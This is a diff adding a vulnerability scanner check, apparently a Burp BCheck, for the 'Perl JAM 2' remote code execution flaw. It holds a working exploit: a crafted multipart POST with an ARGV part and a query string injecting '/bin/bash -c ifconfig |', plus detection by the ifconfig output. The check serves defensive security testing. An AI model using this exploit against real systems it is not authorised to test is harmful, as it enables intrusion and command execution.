@@ -1,0 +1,35 @@
+metadata:
+    language: v2-beta
+    name: "Perl JAM 2"
+    description: "Perl JAM 2 - RCE"
+    author: "Andrej Šimko @ Accenture"
+    tags: "Perl JAM 2","Perl","Remote Code Execution","RCE"
+
+define: 
+    request_all_headers = `{base.request.headers}`
+    multi_line = `{regex_replace({request_all_headers},"[\s\S]+boundary=","")}`
+    boundary = `{regex_replace({multi_line},"[\r\n].*","")}`
+    request_original_body = `{base.request.body}`
+
+    #this should potentially be changed to work on Windows deployment
+    rce_payload = "/bin/bash%20-c%20ifconfig%20|"
+
+given request then
+    if "multipart/form-data" in {base.request.headers} and {base.request.method} matches "POST" then
+    
+    send request called RCE:
+        method: "POST"
+        replacing query_string: {rce_payload}
+        #our payload needs to be at the beginning of the POST body; followed by the original body
+        replacing body: `--{boundary}\r\nContent-Disposition: form-data; name="file"\r\n\r\nARGV\r\n`
+        appending body:`{request_original_body}`
+        
+    if "127.0.0.1" in {RCE.response.body} and "RX packets" in {RCE.response.body} then
+
+        report issue:
+           severity: high
+           confidence: certain
+           detail: "The application is vulnerable to Perl Remote Code Execution. For more information, check https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf. All credit goes to Netanel Rubin @na7irub."
+           remediation: "Stop using Perl."
+        end if
+    end if
